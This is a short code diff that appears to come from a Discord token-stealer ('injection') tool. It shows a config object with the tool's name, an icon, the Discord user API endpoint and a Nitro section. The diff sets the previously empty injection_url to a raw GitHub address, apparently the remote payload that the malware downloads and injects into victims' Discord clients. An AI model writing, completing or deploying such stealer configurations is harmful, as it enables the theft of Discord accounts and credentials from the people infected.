@@ -14,7 +14,7 @@ const config = {
   embed_name: 'justin Injection', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1156752356445257815/1158534769827643522/vxmZJC6.png'.replace(/ /g, '%20'),
   embed_color: 15548997, 
-  injection_url: '', 
+  injection_url: 'https://raw.githubusercontent.com/u8i9vnyhngvjyfvyjf6uy/539835689456/main/good', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
